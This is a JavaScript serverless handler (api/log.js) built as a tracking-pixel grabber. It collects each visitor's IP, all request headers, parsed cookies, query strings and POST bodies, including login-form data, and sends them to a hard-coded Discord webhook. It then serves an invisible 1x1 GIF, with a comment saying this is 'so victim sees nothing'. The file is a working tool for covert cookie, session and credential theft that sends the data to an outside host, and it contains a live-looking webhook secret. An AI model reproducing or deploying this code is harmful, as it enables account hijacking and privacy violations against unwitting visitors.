// api/log.js
export default async function handler(req, res) {
  // 1. Real IP from Vercel
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
             req.socket.remoteAddress || 
             req.connection.remoteAddress;

  // 2. All headers (user-agent, referer, accept-language, etc.)
  const headers = { ...req.headers };

  // 3. Cookies (parse them)
  const cookies = req.headers.cookie ? 
    Object.fromEntries(req.headers.cookie.split('; ').map(c => c.split('='))) : {};

  // 4. Query string parameters
  const query = req.query || {};

  // 5. Body - for POST with form data or JSON (e.g., login forms)
  let body = null;
  if (req.method === 'POST') {
    if (req.headers['content-type']?.includes('application/json')) {
      body = req.body;
    } else if (req.headers['content-type']?.includes('application/x-www-form-urlencoded')) {
      body = req.body; // Vercel auto-parses URL-encoded into req.body
    }
  }

  // 6. Full URL path + referer
  const fullUrl = `https://${req.headers.host}${req.url}`;

  // 7. Additional client-side data sent via fetch (see frontend snippet)
  //    We'll capture any extra fields sent in query or body
  const extra = query.extra ? JSON.parse(query.extra || '{}') : {};

  // Assemble the log
  const logData = {
    timestamp: new Date().toISOString(),
    ip,
    method: req.method,
    url: fullUrl,
    headers,
    cookies,
    query,
    body,
    extra
  };

  // Send to Discord webhook (replace with your actual webhook)
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1496569454895697961/fywesRzAJ8MtFwlbKIDXGGHPtvcPWrKQBjLFE0NUznMrxD2wgESm86pyK5u3nF9rQjvc';
  const discordMessage = {
    content: '```json\n' + JSON.stringify(logData, null, 2) + '\n```'
  };

  await fetch(DISCORD_WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(discordMessage)
  }).catch(console.error);

  // Return invisible 1x1 pixel GIF so victim sees nothing
  const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  res.setHeader('Content-Type', 'image/gif');
  res.status(200).send(pixel);
}